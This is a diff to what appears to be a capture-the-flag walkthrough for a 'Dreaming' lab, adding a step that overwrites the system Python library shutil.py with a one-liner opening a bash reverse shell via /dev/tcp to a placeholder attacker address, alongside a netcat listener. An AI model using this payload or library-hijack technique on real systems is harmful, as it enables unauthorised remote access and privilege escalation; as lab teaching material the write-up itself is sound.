@@ -118,6 +118,13 @@ Can you help Sandman restore his kingdom?</p>
 <pre><code>root@ip-[Attack_IP]:~/Dreaming# nc -nvlp 4444
 </code></pre>
 
+<br>
+
+<pre><code>death@dreaming:/$ echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/[Attack_IP]/[Attack_Port] 0>&1'\")" > /usr/lib/python3.8/shutil.py
+</code></pre>
+
+<br>
+
 ![image](https://github.com/user-attachments/assets/41d937b6-954f-42af-a92b-fee86b4d44e0)
 
 <br>
